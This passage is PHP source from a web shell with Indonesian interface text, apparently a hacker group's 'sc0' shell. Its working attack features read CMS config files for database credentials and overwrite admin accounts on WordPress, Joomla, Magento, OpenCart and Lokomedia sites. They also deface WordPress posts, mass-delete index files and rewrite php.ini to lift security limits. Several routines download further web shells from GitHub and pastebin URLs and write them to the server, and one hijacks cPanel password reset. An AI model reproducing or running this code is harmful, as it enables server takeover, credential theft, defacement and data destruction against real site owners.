 if($cmd_add_user){ echo $gaya_root."<font class='tengahaja'>Ganti Password Username : ".$username." dan Password : ".$password." <font color='greenyellow'>Berhasil!!</font><br /><br />".$o;
 }else { echo $gaya_root."<font class='tengahaja'>Ganti Password Username : ".$username." dan Password : ".$password." <font color='red'>Gagal!!</font><br /><br />".$o;
 } }else { echo $gaya_root."<font class='rapihbanget'>Are You Kidding Me?! Username : </font><font color='orange'>" .$username. " </font><font color='red'> Itu Enggak Ada!!</font><br /><br />".$o;
 } }else { echo $gaya_root."<font class='rapihbanget'> Silahkan Masukkan Dahulu Username Yang Mau Di Hapus!! </font><br /><br />".$o;
 } } } } } else{ echo "<br><br><font color='springgreen' face='Fredericka The Great'>TOOLS GAK BISA DI PAKE NDAN -_- SERVERNYA BUKAN WINDOWS</font>";
 }
 }
 
 
 
 
elseif(isset($_GET['mpc'])){
	echo"<font size='6' color='red'>
#MassPasswdChanger
</font><p>";
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='indoxploit' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='indoxploit' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
}


elseif(isset($_GET['suckmywp'])){
	echo"<font size='6' color='red'>
#WordpressTitleSucks
</font><p>";
	if($_POST['hajar']) {
		$title = htmlspecialchars($_POST['new_title']);
		$pn_title = str_replace(" ", "-", $title);
		if($_POST['cek_edit'] == "Y") {
			$script = $_POST['edit_content'];
		} else {
			$script = $title;
		}
		$conf = $_POST['config_dir'];
		$scan_conf = scandir($conf);
		foreach($scan_conf as $file_conf) {
			if(!is_file("$conf/$file_conf")) continue;
			$config = file_get_contents("$conf/$file_conf");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."posts";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
				} else {
					echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
				}
				if(!$update OR !$conn OR !$db) {
					echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
				} else {
					echo "<font color=lime>sukses di ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit Title+Content WordPress</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by IndoXploit' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
}


elseif(isset($_GET['whmkill0'])){
	echo"<font size='6' color='red'>
#WHMKiller
</font><p>";
		$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function whmkill($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('whmkill.php')) {
		echo "/whmkill.php";
	} else {
		if(whmkill("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/whmc.php","whmkill.php")) {
			echo "/whmkill.php";
		} else {
			echo "<center><font color=red>fail</font></center>";
		}
	}
}


elseif(isset($_GET['w0t'])){
	echo"<font size='6' color='red'>
#MassWipeout
</font><br>Mass delete<p>";
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
	</form></center>";
	}
}


elseif(isset($_GET['byp'])){

echo "<font size='6' color='red'>
#Bypasser
</font><p><br/><br/>###<br/><br/>";
 
?>
					<a href="?bysysfuncwsf"><input class=bordergaya type=submit value="Bypass Root Path With System Function" /></a>
					Or 
					<a href="?bypsini"><input class=bordergaya type=submit value="Bypass Disable Functions" /></a>
					Or
					<a href="?bysysfuncwexec"><input class=bordergaya type=submit value="Bypass Root Path With Exec Function" /></a>
					<p>
                    <a href="?666"><input class=bordergaya type=submit value="AnonGhost Bypasser" /></a>
					
<?php } elseif(isset($_GET['bysysfuncwsf'])){ echo '<br><center><span style="font-size:20px;
 font-family:Fredericka the Great;
 color:orange">Bypass Root Path With System Function</span><center>';
 mkdir('bysyswsf', 0755);
 chdir('bysyswsf');
 $bysyswsf = file_get_contents("http://pastebin.com/raw/nUTTPQnm");
 $file = fopen("bysyswsf.php" ,"w+");
 $write = fwrite ($file ,$bysyswsf);
 fclose($file);
 chmod("bysyswsf.php",0755);
 echo "<iframe src=bysyswsf/bysyswsf.php width=70% height=70% frameborder=0></iframe>";
 } elseif(isset($_GET['bypsini'])){ $byht = "safe_mode = Off
					disable_functions = None
					safe_mode_gid = OFF
					open_basedir = OFF
					allow_url_fopen = On";
 file_put_contents("php.ini",$byht);
 echo "<script>alert('Congrats! Sukses Bos Q ~_^');
 hideAll();
</script>";
 die('<meta http-equiv="refresh" content="0;
 url=?" />');
 } elseif(isset($_GET['bysysfuncwexec'])){ echo '<br><center><span style="font-size:20px;
 font-family:Fredericka the Great;
 color:orange">Bypass Root Path With Exec Function</span><center>';
 mkdir('bysyswexecf', 0755);
 chdir('bysyswexecf');
 $bysyswsf = file_get_contents("http://pastebin.com/raw/KJiLdADd");
 $file = fopen("bysyswexecf.php" ,"w+");
 $write = fwrite ($file ,$bysyswsf);
 fclose($file);
 chmod("bysyswexecf.php",0755);
 echo "<iframe src=bysyswexecf/bysyswexecf.php width=70% height=70% frameborder=0></iframe>";

}

elseif(isset($_GET['666'])){
	
		$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function ghost($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('ghost.php')) {
		echo "/ghost.php";
	} else {
		if(ghost("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/anon.php","ghost.php")) {
			echo "/ghost.php";
		} else {
			echo "<center><font color=red>fail</font></center>";
		}
	}
}


elseif(isset($_GET['call'])){
?>
<br>
<font size='6' color='red'>
#CALL
</font><br>call your fav webtools<p>
	<form action="?call" method="post">
		<td><select class="inputzbut" align="left"  name="pilihan" id="pilih">
		<option value="pini" >Php ini</option>
		<option value="pasir" >Pasirmerah</option>
		<option value="pasir" >Pasirmerah 3</option>
		<option value="bj" >BlackJasmine</option>
		<option value="sc0" >Sc0</option>
		<option value="idx" >IndoXploit</option>
		<option value="idx2" >IndoXploit2</option>
		<option value="w0" >WSO sc0 edition</option>
		<option value="gal" >Gallers</option>
		<option value="c99" >C99</option>
		<option value="sabun" >SabunMassal</option>
		
	</select>
	
	<?php
		echo"<input  type=submit name=submites value=Create>";
if(is_writable(getcwd())){echo ("<font color=green> Dir Writable</font>");
}else{echo ("<font color=red>  Can't Create (Dir Not Writable)</font>");}
$submit = $_POST ['submites'];
if(isset($submit)) {
$pilih = $_POST['pilihan'];
if ( $pilih == 'pini'){
$pehapeini = "safe_mode = OFF
Safe_mode_gid = OFF
disable_functions = NONE
disable_classes = NONE
open_basedir = OFF
suhosin.executor.fun.blacklist = NONE";
file_put_contents("php.ini",$pehapeini);
echo "<br>php.ini created";
}
	elseif($pilih == 'bj'){
$files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/Blackjasmine/master/bj.php");
		file_put_contents("bj.php",$files);
echo"<br>shell created (bj.php)";
	}

	elseif($pilih == 'pasir'){
	$files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/pasir.php");
		file_put_contents("pasir.php",$files);
echo"<br>shell created (pasir.php)";
}

	elseif($pilih == 'pasir3'){
	$files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/pasir3.php");
		file_put_contents("pasir3.php",$files);
echo"<br>shell created (pasir3.php)";
}

elseif($pilih == 'sc0'){
$files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/Stupidc0de-Shell-2016/master/sc0.php");
		file_put_contents("sc0.php",$files);
echo"<br>shell created (sc0.php)";
	}
	
	elseif($pilih == 'idx'){
$files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/idx.php");
		file_put_contents("idx.php",$files);
echo"<br>shell created (idx.php)";
	}
	
	elseif($pilih == 'idx2'){
$files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/ix2.php");
		file_put_contents("idx2.php",$files);
echo"<br>shell created (idx2.php)";
	}

	elseif($pilih == 'w0'){
$files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/w0.php");
		file_put_contents("w0.php",$files);
echo"<br>shell created (w0.php)";
	}

	elseif($pilih == 'oi'){
$files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/oi.php");
		file_put_contents("oi.php",$files);
echo"<br>shell created (oi.php)";
	}

	elseif($pilih == 'sabun'){
$files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/sabun.php");
		file_put_contents("sabun.php",$files);
echo"<br>shell created (sabun.php)";
	}




}

}

elseif(isset($_GET['cpres'])){
	
	 echo '
	 <font size="6" color="red">
#cPresetpasswd
</font><p>
<center>
YOUR MAIL
<form action="#" method="post">
<b> Email : </b>
<input type="email" name="email" style="background-color: white;font: 9pt tahoma;color:lime;" />
<input type="submit" name="submit" value="Send" style="style="border-radius: 6px;font: 9pt tahoma;color:lime;"/>
</form>
<br>
</html>';

$user = get_current_user();
$site = $_SERVER['HTTP_HOST'];
$ips = getenv('REMOTE_ADDR');
if(isset($_POST['submit'])){
$email = $_POST['email'];
$wr = 'email:'.$email;
$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
fwrite($f, $wr);
fclose($f);
$f = fopen('/home/'.$user.'/.contactinfo', 'w');
fwrite($f, $wr);
fclose($f);
$parm = "here : " . $site.':2083/resetpass?start=1';
echo '<br/><center>'.$parm.'</center>';
}
}

elseif(isset($_GET['ab0'])){
	echo"<center><b>

		<br>
[!] NO LEADER WE JUST LAUGH TOGETHER [!]<P>
We were a group of cells, which control the body ,named STUPIDC0DE
<p>We Are : <font color=red>Kerupuk - Synchronizer - Putra Attacker - Seringh - BonzFrozen - Sinkaroid<p></font>
<br><br>
We respect ur code:<p>
<font color=green>
AnonGhost Shell - Gallers Shell - IndoXploit Shell - Shor7cut Shell - WSO Shell<p>
b374k Shell<p>
</font>

Big thx for u
<br>";
}


elseif(isset($_GET['rce'])){
?>
<br>
<font size='6' color='red'>
#CALL
</font><br>call your fav webtools<p>
	<form action="?rce" method="post">
		<td><select class="inputzbut" align="left"  name="pilihan" id="pilih">
		<option value="cons" >Console shell</option>
		<option value="weev" >Weevely</option>
		
		
	</select>
	
	<?php
		echo"<input  type=submit name=submites value=Create>";
if(is_writable(getcwd())){echo ("<font color=green> Dir Writable</font>");
}else{echo ("<font color=red>  Can't Create (Dir Not Writable)</font>");}
$submit = $_POST ['submites'];
if(isset($submit)) {
$pilih = $_POST['pilihan'];

	if($pilih == 'cons'){
$files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/cons.php");
		file_put_contents("cons.php",$files);
echo"<br>shell created (cons.php)";
	}
	
	elseif($pilih == 'weev'){
$files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/weev.php");
		file_put_contents("weev.php",$files);
echo"<br>shell created (weev.php) 4848";
	}

	
}
}

sikel();
